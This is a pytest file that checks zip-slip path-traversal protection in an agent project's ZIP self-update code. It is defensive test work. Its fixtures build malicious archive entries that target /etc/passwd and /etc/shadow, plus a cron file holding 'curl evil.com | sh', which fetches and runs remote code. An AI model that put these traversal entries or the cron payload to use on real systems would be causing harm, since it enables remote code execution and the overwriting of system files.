"""Tests for ZIP self-update path traversal (zip slip) protection."""

import io
import os
import tempfile
import zipfile

import pytest


def _make_zip(entries: dict[str, bytes]) -> bytes:
    """Create a ZIP archive in memory with the given filename->content entries."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w") as zf:
        for name, data in entries.items():
            zf.writestr(name, data)
    return buf.getvalue()


def _extract_with_validation(zip_bytes: bytes, tmp_dir: str):
    """Replicate the validated extraction logic from cmd_update_zip."""
    with zipfile.ZipFile(io.BytesIO(zip_bytes), "r") as zf:
        for member in zf.infolist():
            target = os.path.realpath(os.path.join(tmp_dir, member.filename))
            if not target.startswith(os.path.realpath(tmp_dir) + os.sep) and target != os.path.realpath(tmp_dir):
                raise ValueError(f"Blocked path traversal in ZIP entry: {member.filename}")
        zf.extractall(tmp_dir)


class TestZipSlipProtection:
    """Validate that ZIP extraction rejects path traversal entries."""

    def test_normal_zip_extracts_successfully(self):
        """A normal ZIP with safe paths should extract without error."""
        zip_bytes = _make_zip({
            "hermes-agent-main/README.md": b"# Hermes",
            "hermes-agent-main/tools/approval.py": b"# approval",
        })
        with tempfile.TemporaryDirectory() as tmp:
            _extract_with_validation(zip_bytes, tmp)
            assert os.path.isfile(os.path.join(tmp, "hermes-agent-main", "README.md"))

    def test_dot_dot_traversal_blocked(self):
        """ZIP entry with ../../../etc/passwd must be rejected."""
        zip_bytes = _make_zip({
            "hermes-agent-main/README.md": b"safe",
            "../../../etc/passwd": b"root:x:0:0:root:/root:/bin/bash",
        })
        with tempfile.TemporaryDirectory() as tmp:
            with pytest.raises(ValueError, match="Blocked path traversal"):
                _extract_with_validation(zip_bytes, tmp)

    def test_absolute_path_traversal_blocked(self):
        """ZIP entry with absolute path /etc/cron.d/evil must be rejected."""
        zip_bytes = _make_zip({
            "/etc/cron.d/evil": b"* * * * * root curl evil.com | sh",
        })
        with tempfile.TemporaryDirectory() as tmp:
            with pytest.raises(ValueError, match="Blocked path traversal"):
                _extract_with_validation(zip_bytes, tmp)

    def test_dot_dot_in_middle_blocked(self):
        """ZIP entry like safe/../../../etc/shadow must be rejected."""
        zip_bytes = _make_zip({
            "hermes-agent-main/../../../etc/shadow": b"malicious",
        })
        with tempfile.TemporaryDirectory() as tmp:
            with pytest.raises(ValueError, match="Blocked path traversal"):
                _extract_with_validation(zip_bytes, tmp)

    def test_nested_safe_paths_allowed(self):
        """Deeply nested paths within the extraction dir should succeed."""
        zip_bytes = _make_zip({
            "hermes-agent-main/tools/deep/nested/file.py": b"# deep",
        })
        with tempfile.TemporaryDirectory() as tmp:
            _extract_with_validation(zip_bytes, tmp)
            assert os.path.isfile(os.path.join(tmp, "hermes-agent-main", "tools", "deep", "nested", "file.py"))
